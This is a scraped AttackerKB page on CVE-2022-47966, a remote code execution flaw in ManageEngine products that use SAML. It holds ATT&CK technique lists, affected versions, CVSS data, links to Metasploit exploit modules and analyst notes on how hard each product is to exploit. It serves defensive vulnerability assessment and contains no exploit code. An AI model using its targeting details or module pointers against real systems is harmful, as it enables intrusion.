

[![](/static/public/img/logo-condensed-dark.png)
![](/static/public/img/logo-dark.png)
A Rapid7 Project](/)

* [Activity Feed](/activity-feed)
* [Topics](/topics)
* [About](/about)
* [Leaderboard](/leaderboard)

[Log In](/login)

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
##### Very High

3

### CVE-2022-47966

3

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

##### Advisory

Description:
URL:

Add Another

##### Exploit

Description:
URL:

Add Another

##### Mitigation

Description:
URL:

Add Another

##### Related AttackerKB Topic

Description:
URL:

Add Another

##### Government or Industry Alert

Description:
URL:

Add Another

##### Miscellaneous

Description:
URL:

Add Another

Cancel
Submit

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
###### Very High

(2 users assessed)

![](/static/private/img/attacker-value/dark/attacker-value-3.svg)

Exploitability
###### Moderate

(2 users assessed)

User Interaction
###### [None](/search?userInteraction=NONE)

Privileges Required
###### [None](/search?privilegesRequired=NONE)

Attack Vector
###### [Network](/search?attackVector=NETWORK)

3

# CVE-2022-47966

Disclosure Date: January 18, 2023
•
(Last updated September 17, 2024) ▾

[CVE-2022-47966](/search?q=CVE-2022-47966)
CVSS v3 Base Score:
9.8

Exploited in the Wild

Reported by [mkienow-r7](/contributors/mkienow-r7)  [and 4 more...](#exploited-in-the-wild)

[View Source Details](#exploited-in-the-wild)

Report As Exploited in the Wild

MITRE ATT&CK[Log in to add MITRE ATT&CK tag](/login)
Add MITRE ATT&CK tactics and techniques that apply to this CVE.
Initial Access
Techniques

Validation

Exploit Public-Facing Application

Validated

### MITRE ATT&CK

Select the MITRE ATT&CK Tactics that apply to this CVE

Initial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral MovementCollectionExfiltrationCommand and ControlImpact

##### Collection

Select any Techniques used:

Data from Local System

Data from Removable Media

Data from Network Shared Drive

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Data Staged

Data Staged: Local Data Staging

Data Staged: Remote Data Staging

Screen Capture

Email Collection

Email Collection: Local Email Collection

Email Collection: Remote Email Collection

Email Collection: Email Forwarding Rule

Clipboard Data

Automated Collection

Audio Capture

Video Capture

Man in the Browser

Data from Information Repositories

Data from Information Repositories: Confluence

Data from Information Repositories: Sharepoint

Data from Cloud Storage Object

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Archive Collected Data

Archive Collected Data: Archive via Utility

Archive Collected Data: Archive via Library

Archive Collected Data: Archive via Custom Method

##### Command and Control

Select any Techniques used:

Data Obfuscation

Data Obfuscation: Junk Data

Data Obfuscation: Steganography

Data Obfuscation: Protocol Impersonation

Fallback Channels

Application Layer Protocol

Application Layer Protocol: Web Protocols

Application Layer Protocol: File Transfer Protocols

Application Layer Protocol: Mail Protocols

Application Layer Protocol: DNS

Proxy

Proxy: Internal Proxy

Proxy: External Proxy

Proxy: Multi-hop Proxy

Proxy: Domain Fronting

Communication Through Removable Media

Non-Application Layer Protocol

Web Service

Web Service: Dead Drop Resolver

Web Service: Bidirectional Communication

Web Service: One-Way Communication

Multi-Stage Channels

Ingress Tool Transfer

Data Encoding

Data Encoding: Standard Encoding

Data Encoding: Non-Standard Encoding

Traffic Signaling

Traffic Signaling: Port Knocking

Remote Access Software

Dynamic Resolution

Dynamic Resolution: Fast Flux DNS

Dynamic Resolution: Domain Generation Algorithms

Dynamic Resolution: DNS Calculation

Non-Standard Port

Protocol Tunneling

Encrypted Channel

Encrypted Channel: Symmetric Cryptography

Encrypted Channel: Asymmetric Cryptography

##### Credential Access

Select any Techniques used:

OS Credential Dumping

OS Credential Dumping: LSASS Memory

OS Credential Dumping: Security Account Manager

OS Credential Dumping: NTDS

OS Credential Dumping: LSA Secrets

OS Credential Dumping: Cached Domain Credentials

OS Credential Dumping: DCSync

OS Credential Dumping: Proc Filesystem

OS Credential Dumping: /etc/passwd and /etc/shadow

Network Sniffing

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Brute Force

Brute Force: Password Guessing

Brute Force: Password Cracking

Brute Force: Password Spraying

Brute Force: Credential Stuffing

Two-Factor Authentication Interception

Forced Authentication

Exploitation for Credential Access

Steal Application Access Token

Steal Web Session Cookie

Unsecured Credentials

Unsecured Credentials: Credentials In Files

Unsecured Credentials: Credentials in Registry

Unsecured Credentials: Bash History

Unsecured Credentials: Private Keys

Unsecured Credentials: Cloud Instance Metadata API

Unsecured Credentials: Group Policy Preferences

Credentials from Password Stores

Credentials from Password Stores: Keychain

Credentials from Password Stores: Securityd Memory

Credentials from Password Stores: Credentials from Web Browsers

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Steal or Forge Kerberos Tickets

Steal or Forge Kerberos Tickets: Golden Ticket

Steal or Forge Kerberos Tickets: Silver Ticket

Steal or Forge Kerberos Tickets: Kerberoasting

##### Defense Evasion

Select any Techniques used:

Direct Volume Access

Rootkit

Obfuscated Files or Information

Obfuscated Files or Information: Binary Padding

Obfuscated Files or Information: Software Packing

Obfuscated Files or Information: Steganography

Obfuscated Files or Information: Compile After Delivery

Obfuscated Files or Information: Indicator Removal from Tools

Masquerading

Masquerading: Invalid Code Signature

Masquerading: Right-to-Left Override

Masquerading: Rename System Utilities

Masquerading: Masquerade Task or Service

Masquerading: Match Legitimate Name or Location

Masquerading: Space after Filename

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Indicator Removal on Host

Indicator Removal on Host: Clear Windows Event Logs

Indicator Removal on Host: Clear Linux or Mac System Logs

Indicator Removal on Host: Clear Command History

Indicator Removal on Host: File Deletion

Indicator Removal on Host: Network Share Connection Removal

Indicator Removal on Host: Timestomp

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Modify Registry

Trusted Developer Utilities Proxy Execution

Trusted Developer Utilities Proxy Execution: MSBuild

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Deobfuscate/Decode Files or Information

BITS Jobs

Indirect Command Execution

Traffic Signaling

Traffic Signaling: Port Knocking

Rogue Domain Controller

Exploitation for Defense Evasion

Signed Script Proxy Execution

Signed Script Proxy Execution: PubPrn

Signed Binary Proxy Execution

Signed Binary Proxy Execution: Compiled HTML File

Signed Binary Proxy Execution: Control Panel

Signed Binary Proxy Execution: CMSTP

Signed Binary Proxy Execution: InstallUtil

Signed Binary Proxy Execution: Mshta

Signed Binary Proxy Execution: Msiexec

Signed Binary Proxy Execution: Odbcconf

Signed Binary Proxy Execution: Regsvcs/Regasm

Signed Binary Proxy Execution: Regsvr32

Signed Binary Proxy Execution: Rundll32

XSL Script Processing

Template Injection

File and Directory Permissions Modification

File and Directory Permissions Modification: Windows File and Directory Permissions Modification

File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

Execution Guardrails

Execution Guardrails: Environmental Keying

Group Policy Modification

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Unused/Unsupported Cloud Regions

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Subvert Trust Controls

Subvert Trust Controls: Gatekeeper Bypass

Subvert Trust Controls: Code Signing

Subvert Trust Controls: SIP and Trust Provider Hijacking

Subvert Trust Controls: Install Root Certificate

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Impair Defenses

Impair Defenses: Disable or Modify Tools

Impair Defenses: Disable Windows Event Logging

Impair Defenses: HISTCONTROL

Impair Defenses: Disable or Modify System Firewall

Impair Defenses: Indicator Blocking

Impair Defenses: Disable or Modify Cloud Firewall

Hide Artifacts

Hide Artifacts: Hidden Files and Directories

Hide Artifacts: Hidden Users

Hide Artifacts: Hidden Window

Hide Artifacts: NTFS File Attributes

Hide Artifacts: Hidden File System

Hide Artifacts: Run Virtual Instance

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Modify Cloud Compute Infrastructure

Modify Cloud Compute Infrastructure: Create Snapshot

Modify Cloud Compute Infrastructure: Create Cloud Instance

Modify Cloud Compute Infrastructure: Delete Cloud Instance

Modify Cloud Compute Infrastructure: Revert Cloud Instance

##### Discovery

Select any Techniques used:

System Service Discovery

Application Window Discovery

Query Registry

System Network Configuration Discovery

Remote System Discovery

System Owner/User Discovery

Network Sniffing

Network Service Scanning

System Network Connections Discovery

Process Discovery

Permission Groups Discovery

Permission Groups Discovery: Local Groups

Permission Groups Discovery: Domain Groups

Permission Groups Discovery: Cloud Groups

System Information Discovery

File and Directory Discovery

Account Discovery

Account Discovery: Local Account

Account Discovery: Domain Account

Account Discovery: Email Account

Account Discovery: Cloud Account

Peripheral Device Discovery

System Time Discovery

Network Share Discovery

Password Policy Discovery

Browser Bookmark Discovery

Domain Trust Discovery

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Software Discovery

Software Discovery: Security Software Discovery

Cloud Service Discovery

Cloud Service Dashboard

##### Execution

Select any Techniques used:

Windows Management Instrumentation

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Command and Scripting Interpreter

Command and Scripting Interpreter: PowerShell

Command and Scripting Interpreter: AppleScript

Command and Scripting Interpreter: Windows Command Shell

Command and Scripting Interpreter: Unix Shell

Command and Scripting Interpreter: Visual Basic

Command and Scripting Interpreter: Python

Command and Scripting Interpreter: JavaScript/JScript

Software Deployment Tools

Native API

Shared Modules

Exploitation for Client Execution

User Execution

User Execution: Malicious Link

User Execution: Malicious File

Inter-Process Communication

Inter-Process Communication: Component Object Model

Inter-Process Communication: Dynamic Data Exchange

System Services

System Services: Launchctl

System Services: Service Execution

##### Exfiltration

Select any Techniques used:

Exfiltration Over Other Network Medium

Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth

Automated Exfiltration

Scheduled Transfer

Data Transfer Size Limits

Exfiltration Over C2 Channel

Exfiltration Over Alternative Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

Exfiltration Over Physical Medium

Exfiltration Over Physical Medium: Exfiltration over USB

Transfer Data to Cloud Account

Exfiltration Over Web Service

Exfiltration Over Web Service: Exfiltration to Code Repository

Exfiltration Over Web Service: Exfiltration to Cloud Storage

##### Impact

Select any Techniques used:

Data Destruction

Data Encrypted for Impact

Service Stop

Inhibit System Recovery

Defacement

Defacement: Internal Defacement

Defacement: External Defacement

Firmware Corruption

Resource Hijacking

Network Denial of Service

Network Denial of Service: Direct Network Flood

Network Denial of Service: Reflection Amplification

Endpoint Denial of Service

Endpoint Denial of Service: OS Exhaustion Flood

Endpoint Denial of Service: Service Exhaustion Flood

Endpoint Denial of Service: Application Exhaustion Flood

Endpoint Denial of Service: Application or System Exploitation

System Shutdown/Reboot

Account Access Removal

Disk Wipe

Disk Wipe: Disk Content Wipe

Disk Wipe: Disk Structure Wipe

Data Manipulation

Data Manipulation: Stored Data Manipulation

Data Manipulation: Transmitted Data Manipulation

Data Manipulation: Runtime Data Manipulation

##### Initial Access

Select any Techniques used:

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Replication Through Removable Media

External Remote Services

Drive-by Compromise

Exploit Public-Facing Application

Supply Chain Compromise

Supply Chain Compromise: Compromise Software Dependencies and Development Tools

Supply Chain Compromise: Compromise Software Supply Chain

Supply Chain Compromise: Compromise Hardware Supply Chain

Trusted Relationship

Hardware Additions

Phishing

Phishing: Spearphishing Attachment

Phishing: Spearphishing Link

Phishing: Spearphishing via Service

##### Lateral Movement

Select any Techniques used:

Remote Services

Remote Services: Remote Desktop Protocol

Remote Services: SMB/Windows Admin Shares

Remote Services: Distributed Component Object Model

Remote Services: SSH

Remote Services: VNC

Remote Services: Windows Remote Management

Software Deployment Tools

Taint Shared Content

Replication Through Removable Media

Exploitation of Remote Services

Internal Spearphishing

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Remote Service Session Hijacking

Remote Service Session Hijacking: SSH Hijacking

Remote Service Session Hijacking: RDP Hijacking

Lateral Tool Transfer

##### Persistence

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Account Manipulation

Account Manipulation: Additional Azure Service Principal Credentials

Account Manipulation: Exchange Email Delegate Permissions

Account Manipulation: Add Office 365 Global Administrator Role

Account Manipulation: SSH Authorized Keys

External Remote Services

Create Account

Create Account: Local Account

Create Account: Domain Account

Create Account: Cloud Account

Office Application Startup

Office Application Startup: Office Template Macros

Office Application Startup: Office Test

Office Application Startup: Outlook Forms

Office Application Startup: Outlook Home Page

Office Application Startup: Outlook Rules

Office Application Startup: Add-ins

Browser Extensions

BITS Jobs

Traffic Signaling

Traffic Signaling: Port Knocking

Server Software Component

Server Software Component: SQL Stored Procedures

Server Software Component: Transport Agent

Server Software Component: Web Shell

Implant Container Image

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Compromise Client Software Binary

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

##### Privilege Escalation

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Exploitation for Privilege Escalation

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Group Policy Modification

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Submit

Metasploit Module

[exploit/windows/http/manageengine\_endpoint\_central\_saml\_rce\_cve\_2022\_47966](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966.rb "exploit/windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966")
[exploit/multi/http/manageengine\_servicedesk\_plus\_saml\_rce\_cve\_2022\_47966](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966.rb "exploit/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966")
[exploit/multi/http/manageengine\_adselfservice\_plus\_saml\_rce\_cve\_2022\_47966](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb "exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966")

[CISA KEV Listed](/search?q=cisa_kev_listed&qt=tag)[Common in enterprise](/search?q=common_enterprise&qt=tag)[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Observed in ransomware attacks](/search?q=observed_in_ransomware&qt=tag)[Observed in state-sponsored attacks](/search?q=observed_in_state_sponsored_attacks&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)[Difficult to weaponize](/search?q=difficult_to_develop&qt=tag)[Vulnerable in uncommon configuration](/search?q=obscure_configuration&qt=tag)

### Topic Tags

Select the tags that apply to this CVE (Assessment added tags are disabled and cannot be removed)

What makes this of high-value to an attacker?

Vulnerable in default configuration

Unauthenticated

Observed in state-sponsored attacks

Observed in ransomware attacks

Gives privileged access

Easy to weaponize

Difficult to patch

Common in enterprise

CISA KEV Listed

What makes this of low-value to an attacker?

Vulnerable in uncommon configuration

Requires user interaction

Requires physical access

Requires elevated access

No useful access

Difficult to weaponize

Authenticated

Submit

## Description

Multiple Zoho ManageEngine on-premise products, such as ServiceDesk Plus through 14003, allow remote code execution due to use of Apache Santuario xmlsec (aka XML Security for Java) 1.4.1, because the xmlsec XSLT features, by design in that version, make the application responsible for certain security protections, and the ManageEngine applications did not provide those protections. This affects Access Manager Plus before 4308, Active Directory 360 before 4310, ADAudit Plus before 7081, ADManager Plus before 7162, ADSelfService Plus before 6211, Analytics Plus before 5150, Application Control Plus before 10.1.2220.18, Asset Explorer before 6983, Browser Security Plus before 11.1.2238.6, Device Control Plus before 10.1.2220.18, Endpoint Central before 10.1.2228.11, Endpoint Central MSP before 10.1.2228.11, Endpoint DLP before 10.1.2137.6, Key Manager Plus before 6401, OS Deployer before 1.1.2243.1, PAM 360 before 5713, Password Manager Pro before 12124, Patch Manager Plus before 10.1.2220.18, Remote Access Plus before 10.1.2228.11, Remote Monitoring and Management (RMM) before 10.1.41. ServiceDesk Plus before 14004, ServiceDesk Plus MSP before 13001, SupportCenter Plus before 11026, and Vulnerability Manager Plus before 10.1.2220.18. Exploitation is only possible if SAML SSO has ever been configured for a product (for some products, exploitation requires that SAML SSO is currently active).

[See More
See Less](#description)

* [Ratings & Analysis](#ratings-analysis)
* [Vulnerability Details](#vuln-details)
* [![Rapid7](/static/public/img/rapid7-logo-light.svg)
  ![Rapid7](/static/public/img/rapid7-logo-dark.svg)
  Analysis](#rapid7-analysis)

## Add Assessment

[Log in to add an Assessment](/login)

4

[![](https://avatars.githubusercontent.com/u/104588115?v=4&s=50)](/contributors/rbowes-r7)

**[rbowes-r7 (95)](/contributors/rbowes-r7)**
![](/static/public/img/Badges-20-assessments.svg)

[January 20, 2023 11:16pm UTC (1 year ago)](/assessments/781d7e47-5942-4f26-8077-58445ad9f99f)•
Edited 1 year ago ▾

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Low
[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)[Vulnerable in uncommon configuration](/search?q=obscure_configuration&qt=tag)
###### Technical Analysis

This is a sorta complicated collection of vulnerabilities. In the Rapid7 analysis, we focused on the two most popular pieces of software, which run an ancient version of Santuario 1.4.1 (in part because the public PoCs target that version). Santuario 1.4.1 has absolutely trivial RCE issues.

But, according to the [disclosure blog](https://blog.viettelcybersecurity.com/saml-show-stopper/), other versions have more recent versions of Santuario, but run a version of Xalan that’s vulnerable to a whole other issue – CVE-2014-0107. Dinh found a novel way to exploit CVE-2014-0107, which is super cool, but it was overshadowed by the much simpler vuln in Santuario. I wish they’d named the specific software that CVE-2014-0107 worked against – that’d be a neat one to test, but I don’t think their blog is specific.

The saving grace here is that none of these projects are vulnerable unless SAML is enabled (although in some cases, they’re vulnerable forever if SAML is enabled once).

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/781d7e47-5942-4f26-8077-58445ad9f99f)
[Delete Assessment and Exploited in the Wild Report](/assessments/781d7e47-5942-4f26-8077-58445ad9f99f)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-781d7e47-5942-4f26-8077-58445ad9f99f)

1

[![](https://avatars.githubusercontent.com/u/40408740?v=4&s=50)](/contributors/ccondon-r7)

**[ccondon-r7 (286)](/contributors/ccondon-r7)**
![](/static/public/img/Badges-50-assessments.svg)

[January 23, 2023 4:14pm UTC (1 year ago)](/assessments/5bf0bde9-001e-4863-8720-4e57621d0539)

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Medium
[Common in enterprise](/search?q=common_enterprise&qt=tag)[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)[Difficult to weaponize](/search?q=difficult_to_develop&qt=tag)[Vulnerable in uncommon configuration](/search?q=obscure_configuration&qt=tag)
###### Technical Analysis

Tagging this as both “easy to weaponize” and “difficult to weaponize” since it depends on the product the attacker is targeting. ServiceDesk Plus is trivial to exploit using public PoC (see **[@rbowes-r7](/contributors/rbowes-r7)**’s [assessment](https://attackerkb.com/assessments/781d7e47-5942-4f26-8077-58445ad9f99f)), but other vectors like ADSelfService Plus seem to require some type of info leak to supply the attacker with unique environment values needed to allow the exploit code to execute successfully, as **[@sfewer-r7](/contributors/sfewer-r7)** has demonstrated in our lab. So exploitability for (at least) ServiceDesk Plus is very high, but so far exploitability for (so far) ADSelfService Plus is relatively low. If someone finds an automagical way to obtain the GUID and issuer URL for ADSSP, that’d change the risk calculus some.

Rapid7 is seeing ongoing exploitation of this vulnerability in ServiceDesk Plus, and our honeypots are also seeing activity. The [Rapid7 analysis](https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis?referrer=etrblog/&utm_source=rapid7site&utm_medium=referral&utm_campaign=etr_cve-2022-47966) tab has a ton of detailed technical info.

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/5bf0bde9-001e-4863-8720-4e57621d0539)
[Delete Assessment and Exploited in the Wild Report](/assessments/5bf0bde9-001e-4863-8720-4e57621d0539)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-5bf0bde9-001e-4863-8720-4e57621d0539)

##### CVSS V3 Severity and Metrics

Data provided by the [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
Base Score:

9.8 Critical

Impact Score:

5.9

Exploitability Score:

3.9

Vector:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Attack Vector (AV):

Network

Attack Complexity (AC):

Low

Privileges Required (PR):

None

User Interaction (UI):

None

Scope (S):

Unchanged

Confidentiality (C):

High

Integrity (I):

High

Availability (A):

High

### General Information

Offensive Application
Unknown
Utility Class
Unknown
Ports

Unknown

OS

Unknown

Vulnerable Versions
n/a
Prerequisites

Unknown

Discovered By

Unknown

PoC Author

Unknown

Metasploit Module

Unknown

Reporter

Unknown

### Vendors

* zohocorp

### Products

* manageengine access manager plus,
* manageengine access manager plus 4.3,
* manageengine ad360,
* manageengine ad360 4.3,
* manageengine adaudit plus,
* manageengine adaudit plus 7.0,
* manageengine admanager plus,
* manageengine admanager plus 7.1,
* manageengine adselfservice plus,
* manageengine adselfservice plus 6.2,
* manageengine analytics plus,
* manageengine analytics plus 5.1,
* manageengine application control plus,
* manageengine assetexplorer,
* manageengine assetexplorer 6.9,
* manageengine browser security plus,
* manageengine device control plus,
